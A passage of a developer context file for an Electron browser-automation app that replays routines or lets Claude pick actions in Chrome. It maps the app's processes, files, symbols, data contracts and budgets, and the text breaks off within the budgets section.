# AI_CONTEXT.md

**Read this file first, every session, before opening any other file.**

It exists so an assistant can start work — a new feature, a bug hunt, a review —
without re-reading the codebase to rediscover what is already known. It is a map
and a set of contracts, not a tutorial: it tells you where things live, what
must stay true, and which deeper document answers which question.

Keep it current. The maintenance rules are at the bottom (§12) and are part of
the contract in [CLAUDE.md](CLAUDE.md).

---

## 1. What this project is, in one paragraph

An Electron app that drives a real Chrome, either replaying a stored routine (a
JSON list of steps) or letting Claude decide one action at a time toward a
stated goal. Two backends share one in-page engine
([extension/page-core.js](extension/page-core.js)) and are selected by
`AUTOMATION_BACKEND`: **playwright** (the default) spawns a dedicated Chrome on
its own persistent profile under `userData` and attaches over CDP — logins
persist across runs because the profile does — while **extension** drives the
user's everyday logged-in Chrome through a companion MV3 extension, because
Chrome 136 stopped honouring `--remote-debugging-port` on a default profile
(a non-default `--user-data-dir` still honours it, which is what the playwright
backend relies on). The old unwired attach-to-:9222 `browser-session.ts` is
deleted; `playwright-session.ts` supersedes it.

**There is history, and it carries intent.** `main` tracks
`github.com/channel-dynamics/autonomous-browsing`; the run-thread work and the
playwright backend each landed as their own branch, so `git log` and `git blame`
are worth consulting before you re-derive why something is shaped the way it is.

## 2. Commands

| Command                                                                       | Notes                                                                                      |
| ----------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------ |
| `pnpm --filter autonomous-browsing dev`                                                                 | electron-vite with hot reload                                                              |
| `pnpm --filter autonomous-browsing typecheck`                                                           | `tsc --noEmit`; `strict` + `noUncheckedIndexedAccess` are on                               |
| `pnpm --filter autonomous-browsing test`                                                                    | vitest over `tests/**/*.test.ts` — pure logic only, no Electron, no browser                |
| `pnpm --filter autonomous-browsing exec vitest run tests/routines.test.ts`                                       | one file                                                                                   |
| `pnpm --filter autonomous-browsing exec vitest run -t "substring of the test name"`                              | one test                                                                                   |
| `pnpm --filter autonomous-browsing test:db`                                                             | **must** go through this script — see §9                                                   |
| `pnpm --filter autonomous-browsing test:extension`                                                      | `node tests/content-script.verify.mjs`; content-script checks that cannot run under vitest |
| `pnpm --filter autonomous-browsing test:playwright`                                                     | real-Chrome verify of the playwright backend: launch/adopt lifecycle, trusted input, guards |
| `pnpm --filter autonomous-browsing eval [--suite … --case … --trials N]`                             | model-behaviour evals; **spends live gateway calls** — see [evals/README.md](evals/README.md) |
| `pnpm --filter autonomous-browsing install:host <extension-id> [chrome\|canary\|chromium\|edge\|brave]` | writes the native-host manifest and `relay-shim.sh`                                        |
| `pnpm --filter autonomous-browsing build` / `pnpm --filter autonomous-browsing dist`                                              | bundle into `out/` / package with electron-builder — `dist` **fails** without signing certs |
| `pnpm --filter autonomous-browsing dist:local`                                                          | ad-hoc-signed local package; runs here, fails Gatekeeper elsewhere — see [docs/SIGNING.md](docs/SIGNING.md) |

**Environment.** `AI_GATEWAY_API_KEY`; the dev-only `AUTOMATION_DEBUG`
(`1` for a per-step trace, `dom` to also dump each step's filtered DOM — see
§9); `AUTOMATION_INPUT` (`cdp` or `synthetic` to pin one input path,
default `auto`); `AUTOMATION_BACKEND` (`playwright` — the default — or
`extension`); `AUTOMATION_NAV_ALLOWLIST` (comma-separated hosts a run may
navigate to, subdomains included; unset allows every host — see §12); and
`AUTOMATION_CHROME_PATH` for a Chrome binary outside the standard install
locations. In dev, `loadEnvFile` reads
`.env` from the app path at startup and an already-exported shell value wins.
Packaged builds read the real environment only. Model calls go to Vercel AI
Gateway (`https://ai-gateway.vercel.sh`), not to Anthropic directly.

## 3. Processes and the wire between them

The default **playwright** backend is two processes and one hop:

```
renderer ──contextBridge──► preload ──ipcRenderer──► main
   (sandboxed, window.api)                            │
                                                      ▼
                                  ipc.ts → orchestrator → PlaywrightSession
                                                │              │ CDP over websocket
                                          claude-client   ChromeProcess ──spawn──► Chrome
                                                │              (dedicated profile under userData,
                                          AI Gateway            page-core.js injected per document)
```

The **extension** backend is five processes and four hops. Each arrow is a real
serialization boundary.

```
renderer ──contextBridge──► preload ──ipcRenderer──► main
   (sandboxed, window.api)                            │
                                                      ▼
                                  ipc.ts → orchestrator → ExtensionSession
                                                │              │
                                          claude-client   ExtensionBridge (net.Server)
                                                │              │ newline-delimited JSON
                                          AI Gateway           ▼
                                                        native-host/relay.js   ← Chrome spawns this
                                                               │ 4-byte LE length + JSON over stdio
                                                               ▼
                                                    background.js ──► page-core.js + content.js
```

- **Endpoint**: `~/.outsentia-automation.sock` (mode `0600`) on macOS/Linux,
  `\\.\pipe\outsentia-automation` on Windows. Under `$HOME`, not `/tmp`, so no
  other local user can squat the path.
- **`relay.js` carries no logic.** Chrome spawns a native host as its own child,
  so the extension cannot reach an already-running Electron over stdio. The
  relay only re-frames messages, reconnecting each second while the app is down.
- **Model cost**: a healthy routine run costs **zero** model calls. A chat run
  costs one per step (≤25). Healing costs at most 6 more per routine run.

## 4. File map

| Path                                                                                 | Role                                                             |
| ------------------------------------------------------------------------------------ | ---------------------------------------------------------------- |
| [updates/](updates/)                                                                 | System-routine JSON — the read-only source of truth              |
| [evals/](evals/)                                                                     | Model evals: fixture pages, case JSON, code graders, `FakeSession`, runner |
| [src/shared/types.ts](src/shared/types.ts)                                           | `ActionStep` union and every cross-layer type                    |
| [src/shared/routines.ts](src/shared/routines.ts)                                     | Routine validator, `applyRepairs`, and the export file validator |
| [src/shared/routine-review.ts](src/shared/routine-review.ts)                         | Pre-import review and export-time redaction — pure, no Electron  |
| [src/shared/resume.ts](src/shared/resume.ts)                                         | The five resume gates as one pure plan-or-refusal, shared by the offer and the refusal |
| [src/shared/routine-hash.ts](src/shared/routine-hash.ts)                             | `definitionHash`; apart from `routines.ts` because the renderer bundles that file and `node:crypto` cannot resolve there |
| [src/shared/ipc.ts](src/shared/ipc.ts)                                               | The channel-name map                                             |
| [src/shared/site-memory.ts](src/shared/site-memory.ts)                               | `SiteFact` shapes, `siteDigest`, `sanitiseLabel` — pure, no Electron, no DB |
| [src/main/index.ts](src/main/index.ts)                                               | Boot order, broadcast wiring, teardown                           |
| [src/main/ipc.ts](src/main/ipc.ts)                                                   | Sender-allowlisted handlers — the whole main-process API surface |
| [src/main/db/database.ts](src/main/db/database.ts)                                   | Connection, pragmas, versioned migrations                        |
| [src/main/db/system-routines.ts](src/main/db/system-routines.ts)                     | Read-only mirror of `updates/`, wholesale sync, fs watcher       |
| [src/main/db/user-routines.ts](src/main/db/user-routines.ts)                         | CRUD for chat-saved routines; the validation boundary, and revisions |
| [src/main/db/repair-proposals.ts](src/main/db/repair-proposals.ts)                   | The repair review queue — proposals that outlive their run        |
| [src/main/db/runs.ts](src/main/db/runs.ts)                                           | Run rows, events, artifacts, repairs, retention, boot cleanup    |
| [src/main/db/site-landmarks.ts](src/main/db/site-landmarks.ts)                       | `SiteMemoryStore`: the per-origin landmark table, its validation boundary, eviction and pruning |
| [src/main/automation/orchestrator.ts](src/main/automation/orchestrator.ts)           | Both run loops, the `busy` flag, repair bookkeeping              |
| [src/main/automation/run-queue.ts](src/main/automation/run-queue.ts)                 | The queue in front of the orchestrator: order, priority, dispositions |
| [src/main/automation/session.ts](src/main/automation/session.ts)                     | `AutomationSession` interface, `isHealable`                      |
| [src/main/automation/extension-session.ts](src/main/automation/extension-session.ts) | Param substitution, per-step budgets, the hold-retry loop        |
| [src/main/automation/extension-bridge.ts](src/main/automation/extension-bridge.ts)   | Socket server, request parking, pause/cancel                     |
| [src/main/automation/session-control.ts](src/main/automation/session-control.ts)     | `SessionControl` — what ipc.ts and index.ts need from a backend  |
| [src/main/automation/chrome-process.ts](src/main/automation/chrome-process.ts)       | Finds, spawns, adopts and stops the dedicated Chrome             |
| [src/main/automation/playwright-session.ts](src/main/automation/playwright-session.ts) | The default backend: CDP session, holds, bindings, frame routing |
| [src/main/automation/claude-client.ts](src/main/automation/claude-client.ts)         | Model id, prompts, the two tool definitions                      |
| [src/main/automation/thread.ts](src/main/automation/thread.ts)                       | Pure pruning of the goal run's conversation thread               |
| [src/main/automation/debug-log.ts](src/main/automation/debug-log.ts)                 | Dev-only per-step run trace; off unless `AUTOMATION_DEBUG` is set |
| [src/main/automation/step-healer.ts](src/main/automation/step-healer.ts)             | Repair budget and verdict handling                               |
| [src/main/automation/run-meter.ts](src/main/automation/run-meter.ts)                 | Per-run model spend: calls, the three token families, repair budget |
| [src/main/lib/TokenOptimizer.ts](src/main/lib/TokenOptimizer.ts)                     | Screenshot downscale and DOM skeletonisation                     |
| [src/main/lib/env-file.ts](src/main/lib/env-file.ts)                                 | Dev-only `.env` reader                                           |
| [src/preload/index.ts](src/preload/index.ts)                                         | `window.api`, plus IPC-error unwrapping                          |
| [src/renderer/src/App.tsx](src/renderer/src/App.tsx)                                 | React shell: three rails, the third switched by `View`            |
| [src/renderer/src/components/](src/renderer/src/components/)                         | One component + CSS module per surface; `ui.tsx` has the primitives |
| [src/renderer/src/components/SitesView.tsx](src/renderer/src/components/SitesView.tsx) | The site-memory pane: per-origin landmark list, forget/purge controls |
| [src/renderer/src/state/](src/renderer/src/state/)                                   | Hooks over `window.api`: extension, browser, automations, runs, queue, repairs; plus `useView` |
| [src/renderer/src/state/useSites.ts](src/renderer/src/state/useSites.ts)             | Renderer site-memory state, refreshed on `sites:changed` and `runs:changed` |
| [src/renderer/src/lib/run-model.ts](src/renderer/src/lib/run-model.ts)               | Progress events → a run thread, and the per-step spine marks      |
| [src/renderer/src/lib/telemetry-view.ts](src/renderer/src/lib/telemetry-view.ts)     | Cost, time split and per-step notes, as words                    |
| [src/renderer/src/lib/view.ts](src/renderer/src/lib/view.ts)                         | The `View` union — which surface the detail pane is showing        |
| [src/renderer/src/styles/](src/renderer/src/styles/)                                 | Design tokens, base rules, self-hosted IBM Plex woff2            |
| [extension/page-core.js](extension/page-core.js)                                     | **The one in-page engine both backends inject**: selectors, actions, guards, the on-page HUD and its view lock |
| [extension/background.js](extension/background.js)                                   | Service worker: tabs, scanning, serialization lock               |
| [extension/content.js](extension/content.js)                                         | chrome.runtime transport around page-core                        |
| [native-host/relay.js](native-host/relay.js)                                         | stdio ↔ socket reframing                                         |
| [scripts/install-native-host.mjs](scripts/install-native-host.mjs)                   | Per-browser host manifest + Node-pinning shim                    |
| [scripts/db-verify.mjs](scripts/db-verify.mjs)                                       | Bundles and runs the db assertions under Electron's Node         |
| [scripts/install-macos.sh](scripts/install-macos.sh)                                 | Internal Mac install: clears the download quarantine so Gatekeeper stays quiet; `.command` twin is the double-click wrapper |
| [scripts/install-windows.ps1](scripts/install-windows.ps1)                           | Internal Windows install: clears Mark of the Web so SmartScreen stays quiet; `.cmd` twin is the double-click wrapper |

## 5. Symbol index — grep these names, do not re-explore

Line numbers drift; symbol names do not. Search by name.

| Looking for                            | Symbol                                       | File                            |
| -------------------------------------- | -------------------------------------------- | ------------------------------- |
| The step union                         | `ActionStep`                                 | shared/types.ts                 |
| Routine validation                     | `assertRoutineDefinition`                    | shared/routines.ts              |
| Writing a repair back into a routine   | `applyRepairs`                               | shared/routines.ts              |
| Whether a repair may be written back   | `isLikeForLike`                              | shared/routines.ts              |
| Whether a proposal still fits its step | `isStaleRepair`                              | shared/routines.ts              |
| Which required params are still blank  | `requiredParams`                             | shared/routines.ts              |
| Whether a run may be resumed           | `planResume`, `unresolvedTemplates`          | shared/resume.ts                |
| Drift detection for a stored routine   | `definitionHash`                             | shared/routine-hash.ts          |
| The portable file format               | `assertRoutineFile`, `ROUTINE_FILE_FORMAT_VERSION` | shared/routines.ts        |
| What an import is about to add         | `reviewRoutineFile`, `classifyUrl`           | shared/routine-review.ts        |
| Secrets an export would leak           | `findSecrets`, `redact`                      | shared/routine-review.ts        |
| The repair review queue                | `RepairProposalStore`, `asStepRepair`        | main/db/repair-proposals.ts     |
| Routine history and undo               | `revisions`, `definitionAt`, `RevisionProvenance` | main/db/user-routines.ts   |
| Every IPC channel name                 | `IpcChannels`                                | shared/ipc.ts                   |
| Every main-process handler             | `registerIpcHandlers`                        | main/ipc.ts                     |
| Which senders may call IPC             | `trustSender`, `trustedSenders`              | main/ipc.ts                     |
| Where `updates/` resolves per build    | `resolveUpdatesDir`                          | main/index.ts                   |
| Schema history                         | `MIGRATIONS`                                 | main/db/database.ts             |
| Wholesale system sync + watcher        | `syncFromDir`, `watch`                       | main/db/system-routines.ts      |
| The validation boundary                | `UserRoutineStore.save(input: unknown)`      | main/db/user-routines.ts        |
| Name-clash behaviour                   | `RoutineNameConflictError`                   | main/db/user-routines.ts        |
| Routine run loop                       | `runRoutine`                                 | automation/orchestrator.ts      |
| Resuming from a step                   | `runRoutine`'s `resume` argument, `ResumeDescriptor` | automation/orchestrator.ts, shared/types.ts |
| Chat run loop                          | `runChatGoal`                                | automation/orchestrator.ts      |
| Narrowing model output to a step       | `toActionStep`                               | automation/orchestrator.ts      |
| Progress-line text                     | `describeStep`                               | shared/routines.ts              |
| Run serialisation and ordering          | `RunQueue`, `pump`, `dispatch`               | automation/run-queue.ts         |
| The one-run **assertion** behind it     | `OrchestratorBusyError`, `busy`              | automation/orchestrator.ts      |
| Queue refusals the renderer renders     | `QueueFullError`, `QueueSupersededError`     | automation/run-queue.ts         |
| Refusing to start into a hold           | `BrowserPausedError`                         | automation/session.ts           |
| Repair budget and verdicts             | `StepHealer.plan`                            | automation/step-healer.ts       |
| Model id, prompts, tools               | `MODEL`, `SYSTEM_PROMPT`, `REPAIR_PROMPT`    | automation/claude-client.ts     |
| The goal loop's threaded model call    | `nextAction`, `ThreadTurn`                   | automation/claude-client.ts     |
| One turn's page payload                | `pageTurn`, `pageText`                       | automation/orchestrator.ts      |
| What a step deposits into memory       | `createDepositor`                            | automation/orchestrator.ts      |
| What a site taught earlier runs        | `SiteMemoryStore`, `SiteFact`                | main/db/site-landmarks.ts, shared/site-memory.ts |
| Which observed steps are remembered    | `controlFact`, `routeFact`, `obstacleFact`   | shared/site-memory.ts           |
| What the model is told about a site    | `siteDigest`                                 | shared/site-memory.ts           |
| The label guard                        | `sanitiseLabel`                              | shared/site-memory.ts           |
| Keeping the thread from growing        | `pruneThread`, `KEEP_PAGES`                  | automation/thread.ts            |
| Has the page moved at all?             | `pageSignature`                              | automation/orchestrator.ts      |
| Which failures may be retried          | `isHealable`                                 | automation/session.ts           |
| The **healable** error class            | `StepExecutionError`                         | automation/session.ts           |
| Never-healed outcomes                   | `RunPausedError`, `RunCancelledError`, `NeedsHumanError`, `AssertionFailedError`, the credential refusal | automation/session.ts |
| Writing a run down                     | `RunStore`, `RunOpenMeta`                    | main/db/runs.ts                 |
| A run's ancestry                       | `RunStore.chainRepairsUsed`, `RunStore.chainCommitting` | main/db/runs.ts      |
| Per-run cost accumulator               | `RunMeter`, `record`, `spendRepairBudget`    | automation/run-meter.ts         |
| Which layer got a step through         | `ResolvedBy`, `settled`, `StepTelemetry`     | shared/types.ts, orchestrator   |
| One step's measured row                | `RunStepRecord`, `recordStep`                | shared/types.ts, main/db/runs.ts |
| A run's cost totals                    | `RunUsage`, `recordUsage`                    | shared/types.ts, main/db/runs.ts |
| Per-routine rollup across runs         | `RunStore.health`, `RoutineHealth`           | main/db/runs.ts, shared/types.ts |
| The health surface                     | `HealthView`, `useHealth`, `runs:health`     | renderer/components, shared/ipc.ts |
| The site-memory surface                | `SitesView`, `useSites`, `sites:list`        | renderer/components, shared/ipc.ts |
| Cost and timing as words               | `costLine`, `timeSplit`, `stepNote`          | renderer/lib/telemetry-view.ts  |
| Did layer 0 have to work for it?       | `waitForActionable` → `{ el, recovered }`    | extension/page-core.js          |
| Per-step shape for the runs list       | `stepOutcomes`                               | main/db/runs.ts                 |
| The single run writer                  | `runObserver`                                | main/ipc.ts                     |
| Which run a hold belongs to            | `RunContext`, `setRunContext`                | automation/session.ts           |
| Telling the thread a scan hold happened| `HoldReporter`, `setHoldReporter`            | automation/session.ts           |
| Unwinding a run, and with what error   | `abortRun`                                   | automation/extension-bridge.ts  |
| The backend contract                   | `AutomationSession`                          | automation/session.ts           |
| Per-step timeout derivation            | `stepTimeout`                                | automation/extension-session.ts |
| `{{param}}` substitution               | `resolveStep`                                | shared/routines.ts              |
| Hold-then-retry loop                   | `ExtensionSession.dispatch`                  | automation/extension-session.ts |
| Parking a run until Resume              | `waitWhileHeld`                              | automation/extension-bridge.ts  |
| Socket, parked requests, cancel        | `ExtensionBridge`                            | automation/extension-bridge.ts  |
| Socket path / version handshake        | `BRIDGE_ENDPOINT`, `EXTENSION_VERSION`       | automation/extension-bridge.ts  |
| Timed-out-but-maybe-ran                | `StepIndeterminateError`                     | automation/extension-bridge.ts  |
| DOM squeeze / screenshot squeeze       | `filterDom`, `optimizeScreenshot`            | main/lib/TokenOptimizer.ts      |
| URL protocol + host allowlist          | `assertNavigable`, `navAllowlist`            | background.js & playwright-session.ts |
| Page content fenced as untrusted data  | `PAGE_FENCE_RULE`, `describePage`            | automation/claude-client.ts     |
| A page impersonating the engine        | `UntrustedPageError`                         | automation/session.ts           |
| Message ordering, and what bypasses it | `serialize`, `CONTROL_TYPES`                 | extension/background.js         |
| Selector resolution and ranking        | `best`, `queryAll`, `rank`                   | extension/page-core.js            |
| The `:has-text()` extension            | `HAS_TEXT`, `accessibleText`                 | extension/page-core.js            |
| Did the page react?                    | `observe`, `SETTLE_MS`                       | extension/page-core.js            |
| **The** credential guard               | `assertWritableTarget`                       | extension/page-core.js            |
| Page-wide hold heuristic               | `scanSensitive`                              | extension/page-core.js            |
| Bot-wall detection                     | `WALL`, `scanWall`                           | extension/page-core.js            |
| Handing a goal run to a person         | `handOff`, `MAX_HUMAN_HOLDS`                 | automation/orchestrator.ts      |
| Synthetic typing / clicks (fallback)   | `setValue`, `press`, `submitFrom`            | extension/page-core.js            |
| Asking for trusted input               | `dispatch`, `centre` (transport: `requestInput` dep) | extension/page-core.js    |
| The on-page HUD and the view lock      | `buildHud`, `setLocked`, `LOCK_EVENTS`       | extension/page-core.js            |
| Telling the agent's input from a person's | `agentIsDriving`, `AGENT_INPUT_GRACE_MS`  | extension/page-core.js            |
| The engine factory both backends call  | `__oaCore.create(deps)`                      | extension/page-core.js          |
| The default backend                    | `PlaywrightSession`                          | automation/playwright-session.ts |
| Backend contract for ipc/index wiring  | `SessionControl`                             | automation/session-control.ts   |
| Spawning/adopting the dedicated Chrome | `ChromeProcess`, `adopt`, `launch`, `stop`   | automation/chrome-process.ts    |
| The page-side call seam                | `HOOKS_CALL`, `callHooks`, `adapterSource`   | automation/playwright-session.ts |
| Trusted-input gate (nonce, in-flight)  | `onInput`, `dispatchInput`                   | automation/playwright-session.ts |
| Navigation-tore-down-the-step mapping  | `DESTROYED`, `departedResult`                | automation/playwright-session.ts |
| Pre-login browser IPC                  | `BrowserHost`, `browserStatus` channels      | main/ipc.ts, shared/ipc.ts      |
| Renderer browser control               | `useBrowser`                                 | renderer/state/useBrowser.ts    |
| The CDP command sequences              | `inputCommands`                              | extension/background.js         |
| Attaching and losing the debugger      | `ensureAttached`, `dispatchInput`, `attachedTabId` | extension/background.js   |
| Order-placing detection                | `isCommitting`, `COMMIT_WORDS`               | extension/page-core.js            |
| The action table                       | `ACTIONS`                                    | extension/page-core.js            |
| Progress events → a thread             | `stepMarks`, `threadRows`, `closingNote`     | renderer/lib/run-model.ts      |
| Renderer run state                     | `useRuns`                                    | renderer/state/useRuns.ts      |
| The re-run and resume surfaces         | `RerunAction`, `ResumeAction`                | renderer/components/ThreadView.tsx |
| Renderer queue state and controls      | `useQueue`, `controlState`, `workLabel`      | renderer/state/useQueue.ts, renderer/lib/queue-view.ts |
| The autonomy spine                     | `SpineMini`, `SpineSlice`                    | renderer/components/Spine.tsx  |
| Which surface the detail pane shows    | `View`, `DEFAULT_VIEW`, `showQueueTab`       | renderer/lib/view.ts           |
| Switching surface                      | `useView`                                    | renderer/state/useView.ts      |
| The queue pane and its interruptions   | `QueueView`, `QueueNotices`                  | renderer/components/           |
| The repair review pane                 | `RepairsView`, `useRepairs`                  | renderer/components/, state/   |
| Reading a queue snapshot               | `controlState`, `queueDepth`, `runningEntry` | renderer/lib/queue-view.ts     |

## 6. Data contracts

**Nine step kinds**, a closed union in `shared/types.ts`, validated
field-by-field in `shared/routines.ts` — strict in both directions (missing
required fields _and_ unknown keys are errors).

| Kind         | Fields                                               | Executed by   |
| ------------ | ---------------------------------------------------- | ------------- |
| `navigate`   | `url`                                                | background.js |
| `screenshot` | `label?`                                             | background.js |
| `click`      | `selector`                                           | page-core.js  |
| `type`       | `selector`, `text`, `submit?`                        | page-core.js  |
| `select`     | `selector`, `value`                                  | page-core.js  |
| `wait`       | `forSelector?`, `ms?` (one required, `ms` ≤ 300 000) | page-core.js  |
| `scroll`     | `selector?`, `to?` (`top`\|`bottom`)                 | page-core.js  |
| `extract`    | `selector`, `into`                                   | page-core.js  |
| `assert`     | `selector`, `expect?` (`present`\|`absent`), `containsText?`, `message?` | page-core.js  |

Every kind also accepts `intent` — what the step is _for_. A repair reads it to
understand purpose rather than guessing from a selector.

**A goal run's `type` may carry `submit`**, which presses Enter. Without it the
model has to click a submit button as a second step, and most search pages —
Google among them — render none, so the click fails, burns the failure budget,
and the run limps to the results by URL instead. It is a step-budget fix, not a
convenience.

**Chat runs can only produce `click`, `type`, and `navigate`** — enforced by the
`action` enum in `DECIDE_NEXT_ACTION_TOOL`'s `input_schema` in `claude-client.ts`,
**not** by `toActionStep`, which has working cases for `select`, `wait` and
`scroll` so a repair may use them. So a chat-saved routine is a subset of what a
hand-written one may express, but change the tool schema to widen it, not the
narrowing function.

The enum also holds two answers that are **not** steps: `done`, and
`needs_human` for a page only a person can get past. `runChatGoal` branches on
both before `toActionStep`, which rejects them — a hand-off is a hold, so it is
never recorded and can never be saved into a routine.

**A `PageSnapshot` carries `blockedBy`** — the bot wall the extension recognised
on the page, or `null`. It comes back on the `DOM` reply, so it costs no extra
round trip.

**`run_artifacts.kind` is `screenshot`, `extract` or `repair`.** The third
arrived with PRD 03 and cost a table rebuild, because a `CHECK` cannot be
`ALTER`ed. A repair frame is the page as it was when the step failed; it reaches
the store through `RunObserver.artifact`, never through the repair row, and
`StepRepair.screenshotBase64` exists only between the healer and that call.

**A routine file is a sibling of `updates/`, not a superset.** `RoutineFile` carries
`formatVersion`, `name`, `description` and `definition` — and deliberately not `id`
or the routine `version` that `parseRoutineFile` demands, so an exported file
dropped into `updates/` fails and a system routine does not round-trip. Import
always lands as `source: 'import'`. Two validators, one boundary:
`assertRoutineFile` checks the wrapper and `UserRoutineStore.save` now rejects
unknown keys of its own, because `userSave` is reachable from the renderer and
would otherwise be a way past the wrapper entirely.

**A `StepOutput` carries `via`** — `cdp` or `synthetic`, which input path ran
the step, or absent for kinds that dispatch no input. It reaches `trace.jsonl`
through the `outcome` spread and exists so a run can be read back path by path.

**Params** are `{{name}}` and substituted only into `navigate.url`, `type.text`,
`select.value` and `assert.containsText` — never into selectors, so a literal
`{{…}}` in CSS survives.
`extract.selector` is resolved by the orchestrator instead, because extraction
feeds the bag later steps read from. Unknown params resolve to `''`.

**A run returns `RunResult`** — `{ runId, extracted, artifacts, repairs }`.
`extracted` holds only what `extract` steps produced, never the caller's params.

**Every run is also written down.** Four tables — `runs`, `run_events`,
`run_artifacts`, `run_repairs`, the last three cascading on `run_id`. A run's
status separates outcome from phase:

| Status | Meaning |
| ------ | ------- |
| `running`, `held` | live; `held` resolves to another status and is never an outcome |
| `done` | every step run by the automation, nobody stepped in |
| `assisted` | completed, but `human_steps` > 0 — the autonomy number the product is judged on |
| `error`, `cancelled` | failed, or the user pressed Stop — told apart by error *class* in main. A goal run that exhausts `MAX_CHAT_STEPS` without reaching its goal is an `error`, not a `done`: the goal was not met, and a run filed as `done` is one nobody goes back to look at |
| `interrupted` | the row was open when the app quit; closed at next boot |

**The queue has its own cross-layer contract.** `QueueWork` is a discriminated
union — `routine`, `chat`, or a `lease` PRD 13 will produce — and a `QueueEntry`
carries its `QueuePriority`, its `QueueEntryState` (`waiting`,
`waiting-for-extension`, `announcing`, `running`, `held`) and its timestamps. A
`QueueSnapshot` is what `queue:list` and `queue:changed` carry: the entries with
the running one at position 0, the recent `QueueDrop`s, `suspended`, and `full`.
Every entry ends in exactly one `QueueDisposition` — `started`,
`cancelled-by-user`, `superseded`, `refused-queue-full`, `expired-no-extension`,
`dropped-app-quit` — and the counts stay inside `RunQueue`, logged at quit. The
`routine` variant also carries an optional `resume` summary
(`{ fromRunId, startIndex }`) rather than a fourth variant, because `workLabel`
must name a resumed entry apart from a fresh run of the same routine.

The orchestrator reports through a **`RunObserver`**, not a bare progress
callback: `progress`, plus optional `artifact`, `repair`, `recorded`, `step`,
`usage`, `learned` and `scored`. **`step` files one `run_steps` row per executed step** — duration split
into browser/model/held time, the attempt it settled on, and `resolvedBy`, which
names the healing layer that got it through (`direct`, `recovered`, `repair`,
`proceed`, `human`, `failed`, and `resumed`, which a replayed `navigate` files).
A `RunStepRecord` also carries **`committing`** — the page's own commit verdict
for that step, `NULL` when the backend reported none — persisted on
`run_steps.committing`, which is what the resume gates read back.
**`usage` writes the run's model spend** onto the
`runs` row and fires once more in the `finally`, *after* the terminal event has
closed the row — so `RunStore.recordUsage` must never require an open row.
`repair_budget_spent` and `repair_calls` are deliberately two numbers: the healer
decrements its budget before it calls anything, so a dead socket spends budget
with no call behind it. `input_tokens`, `cached_input_tokens` and
`cache_write_tokens` are priced apart and are never summed.
`AutomationProgressEvent` carries `step` (the resolved `ActionStep`) on step
events and nothing on phase or terminal events; `AutomationHoldEvent` carries
`runId` and `stepIndex`. Screenshots live on disk under
`userData/runs/<runId>/`, never in SQLite.

**`learned(fact: SiteFact)` and `scored(origin, kind, factKey, worked)` are how
a run writes to site memory.** A `SiteFact`'s `kind` is one of three:
`control` (a selector that changed the page), `route` (a URL that loaded and
then held up under the next step), or `obstacle` (a wall, keyed on its
blocking marker because it has neither a selector nor a URL). `controlFact`
reports a fact only when all four of its conditions hold: the step is a
`click`/`type`/`select` (`CONTROL_KINDS`), it settled through
`direct`/`recovered`/`repair` and not `proceed`/`human`/`failed`/`resumed`,
`output.changed` is `true`, and `output.committing` is not `true`. The two run
loops feed a deposit its URL differently: `runChatGoal` already holds
`snapshot.url`, but `runRoutine` reads `AutomationSession.currentUrl()`, which
Playwright answers from `activePage.url()` and the extension backend answers
`null` unconditionally — it has no cheap current-URL source. A routine run
therefore deposits nothing on the extension backend; a goal run deposits on
both. **Both loops pass the URL the step started on**, never the one it ended
at: a control qualifies only when it changed the page, and navigating is the
commonest way a page changes, so reading `currentUrl()` after the step files
the selector under the origin it navigated to rather than the one it exists on.
`runRoutine` therefore captures it before the step and uses that captured value
in the `finally`.

**A run also records where it came from.** `runs` gained `rerun_of`,
`resumed_from_run_id`, `resume_start_index`, `definition_hash`,
`routine_revision`, `error_kind` and `resume_vars`, and every one of them is
**nullable** — a chat run hashes nothing and has no routine revision, so a
`NOT NULL ADD COLUMN` would force a lie for every chat row. The two run links
are `ON DELETE SET NULL`, so retention prunes one member of a chain and never
the chain — and so a future rebuild of `runs` wipes every link in the database,
see §9. `resume_vars` holds the merged bag the resumed run started from,
which is what makes a resume of a resume self-describing; `repairsUsed` is not
stored, because `chainRepairsUsed` sums `runs.repair_budget_spent` over the
`resumed_from_run_id` ancestry. It sums that column and not `COUNT(run_repairs)`
because the healer decrements its budget before it calls anything, so a
`proceed`, a `giveUp` and a dead socket each cost the chain a repair with no
`run_repairs` row behind them. `AutomationProgressEvent` carries **`errorKind`** on
terminal events — `'cancelled'`, `'indeterminate'` or `'assertion'`, absent
otherwise — because only messages cross IPC and the renderer must not parse
`run.error` to find out which one it was.

## 7. Budgets

| Constant                     | Value                             | Where             |
| ---------------------------- | --------------------------------- | ----------------- |
| `MAX_CHAT_STEPS`             | 100                               | orchestrator      |
| `MAX_CHAT_FAILURES`          | 6 consecutive                     | orchestrator      |
| `MAX_STATIC_LOOKS`           | 8 identical pages                 | orchestrator      |
| `MAX_DECISION_TOKENS`        | 4096                              | claude-client     |
| `KEEP_PAGES`                 | 2 page payloads in the thread     | thread.ts         |
| `MAX_HUMAN_HOLDS`            | 30 hand-offs per goal run         | orchestrator      |
| `MAX_ATTEMPTS_PER_STEP`      | 3                                 | orchestrator      |
| `MAX_REPAIRS_PER_RUN`        | 6, **per chain** — see below      | shared/resume.ts  |
| `MAX_HELD_RETRIES`           | 3                                 | extension-session |
| `MAX_EXTRACT_CHARS`          | 10 000                            | extension-session **and** playwright-session |
| `MAX_WAIT_MS`                | 300 000                           | shared/routines   |
| Action / navigate budget     | 10.75 s / 20 s, each + 5 s margin | extension-session |
| Settle window, selector poll | 750 ms, 100 ms                    | page-core.js        |
| `ABSENCE_GRACE_MS`           | 1 000 ms                          | page-core.js, mirrored in extension-session |
| `AGENT_INPUT_GRACE_MS`       | 200 ms                            | page-core.js        |
| Screenshot                   | ≤1024×768, JPEG q55               | TokenOptimizer    |
| `MAX_RUNS` / `MAX_RUN_AGE_MS`| 200 runs / 30 days                | main/db/runs.ts   |
| `MAX_REVISIONS_PER_ROUTINE`  | 50, plus an unevictable baseline  | main/db/user-routines.ts |
| `MAX_DIGEST_LANDMARKS`       | 12 landmarks                      | shared/site-memory.ts |
| `MAX_DIGEST_CHARS`           | 1200 chars                        | shared/site-memory.ts |
| `MAX_LANDMARK_LABEL_CHARS`   | 80 chars                          | shared/site-memory.ts |
| `MAX_LANDMARK_FIELD_CHARS`   | 200 chars, selector, route URL, factKey and label | shared/site-memory.ts |
| `MAX_LANDMARKS_PER_ORIGIN`   | 40                                 | main/db/site-landmarks.ts |
| `MAX_LANDMARK_AGE_MS`        | 90 days                           | main/db/site-landmarks.ts |
| `MAX_ORIGINS`                | 200                                | main/db/site-landmarks.ts |

`MAX_REPAIRS_PER_RUN` is spent by the whole chain, not by each run in it: a
